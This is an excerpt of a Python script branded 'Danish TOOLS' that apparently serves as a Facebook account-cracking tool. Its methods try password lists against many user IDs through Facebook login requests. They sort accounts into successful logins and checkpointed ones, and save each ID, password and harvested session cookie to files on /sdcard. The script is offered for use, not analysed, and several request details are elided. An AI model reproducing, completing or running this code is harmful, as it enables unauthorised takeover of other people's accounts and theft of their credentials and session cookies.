...
os.system('clear')
print('\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] WELCOME TO Danish TOOLS')
os.system('espeak -a 300 "WELCOME, TO, Danish, KING, TOOLS,"')
...
{R}({G1}ð§ð©{R}) {G1}DEVELOPER  {R}â   {G2} Danish~KING
{R}({G1}ð§ð©{R}) {G1}GITHUB     {R}â   {Y} Danish's TEAM
...
class main_crack:
    ...
    def crack(self, id):
        clear()
        print(f'{G1}[{A}={G1}] EXAMPLE {A}:{G1} /sdcard/Danish .txt')
        linex()
    ...
    def methodA(self, sid, name, psw):
        ...
        sys.stdout.write(f'\r{G1}[{A}Danish -M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ')
        sys.stdout.flush()
        try:
            fs = name.split(' ')[0]
            ls = name.split(' ')[1]
        ...
        for pw in psw:
            ...
            with requests.Session() as session:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r{G1}[Danish-OK] {sid} | {ps} ')
                    open('/sdcard/Danish -M1-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f'\r\r{M}[Danish -CP] {sid} | {ps} ')
                    open('/sdcard/Danish -M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '\n')
                    cps.append(sid)
                    break
                else:
                    continue
    ...
    def methodB(self, sid, name, psw):
        global loop
        sys.stdout.write(f'\r{G1}[{A}Danish -M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ')
        sys.stdout.flush()
        try:
            fs = name.split(' ')[0]
            ls = name.split(' ')[1]
        ...
        for pw in psw:
            ...
            with requests.Session() as session:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f'\r\r{G1}[Danish -OK] {sid} | {ps} ')
                    open('/sdcard/Danish -M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f'\r\r{M}[Danish -CP] {sid} | {ps} ')
                    open('/sdcard/Danish XD -M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '\n')
                    cps.append(sid)
                    break
                else:
                    continue
...
def randm(ids, psd):
    global loop, ok, cp
    sys.stdout.write(f'\r{G1}[{A}Danish-{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            data = {
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[Danish -OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/Danish -OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
                ok.append(uid)
                break
            else:
                continue
